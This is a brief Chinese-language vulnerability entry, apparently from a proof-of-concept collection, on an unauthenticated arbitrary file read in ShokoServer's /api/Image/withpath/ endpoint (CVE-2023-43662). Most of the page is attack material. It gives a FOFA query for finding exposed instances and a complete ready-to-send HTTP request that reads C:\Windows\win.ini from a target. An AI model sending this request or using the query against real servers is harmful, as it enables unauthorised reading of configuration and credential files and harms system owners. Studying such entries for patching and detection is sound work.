## ShokoServer系统withpath任意文件读取漏洞(CVE-2023-43662)

ShokoServer /api/Image/withpath/接口处存在任意文件读取漏洞，未经身份验证得攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```
title="Shoko WEB UI"
```

## poc

```
GET /api/Image/withpath/C:\Windows\win.ini HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```

![image-20240621183622365](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406211836419.png)